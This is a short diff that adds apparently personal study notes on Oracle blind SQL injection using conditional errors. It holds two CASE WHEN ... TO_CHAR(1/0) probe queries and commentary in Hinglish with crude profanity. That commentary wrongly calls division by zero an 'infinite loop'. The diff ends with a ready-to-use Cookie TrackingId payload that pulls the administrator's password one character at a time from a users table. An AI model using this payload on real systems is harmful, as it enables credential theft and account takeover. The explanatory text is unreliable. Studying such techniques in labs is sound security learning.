@@ -1,0 +1,18 @@
+SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual
+select case when (1=1) then TO_CHAR(1/0) else '' end from dual
+
+
+
+ismme simple funda hai ,, agar condition true hai tooo , 
+sql server ki ma chodd dena hai 
+
+
+isme normaly kya hoo rha hai ,, ki agar true hai , tb too true excute hoo rha hai 
+lekin false me v true exxecute hoo ja rha hai 
+
+too iski ma ki chot , karna kya hia apan ko ,
+agar case true hai too , usko infine loop me dal dena hai
+
+jese 1/0 ---> infinite loop :"))))))
+
+Cookie: TrackingId=3RlsdI13C2D187M8'||(select case when substr(password,1,1)='t' then to_char(1/0) else '' end from users where username='administrator')||'
